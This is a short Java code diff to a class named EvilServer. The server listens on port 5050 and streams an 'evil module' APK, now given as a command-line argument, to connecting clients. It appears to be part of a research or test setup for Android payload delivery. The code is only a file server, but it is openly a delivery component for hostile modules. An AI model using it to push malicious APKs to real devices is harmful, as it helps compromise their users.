@@ -6,9 +6,24 @@ import java.nio.ByteBuffer;
 public class EvilServer {
 
     public static final int PORT = 5050;
-    public static final String evilTestFile = "./EvilModule.apk";
+    public static String evilModulePath;
 
     public static void main(String[] args) throws IOException {
+
+        if (args.length != 1) {
+            System.err.println("USAGE: <evil-module-path>");
+            System.err.println("Aborting...");
+            return;
+        }
+
+        evilModulePath = args[0];
+        if (!validPath(evilModulePath)) {
+            System.err.println("Specified evil module isn't a valid file: " + evilModulePath );
+            System.err.println("Aborting...");
+            return;
+        }
+
+
         ServerSocket serverSocket = new ServerSocket(PORT);
 
         while(true) {
@@ -28,12 +43,17 @@ public class EvilServer {
         }
     }
 
+    private static boolean validPath(String filePath) {
+        File file = new File(filePath);
+        return file.exists();
+    }
+
     private static void serve(Socket socket) throws IOException {
         OutputStream out = socket.getOutputStream();
 
-        File file = new File(evilTestFile);
+        File file = new File(evilModulePath);
         System.out.println(file.length());
-        try (InputStream in = new FileInputStream(evilTestFile)) {
+        try (InputStream in = new FileInputStream(evilModulePath)) {
 
             int fileSize = (int) file.length();
             ByteBuffer byteBuffer = ByteBuffer.allocate(4);
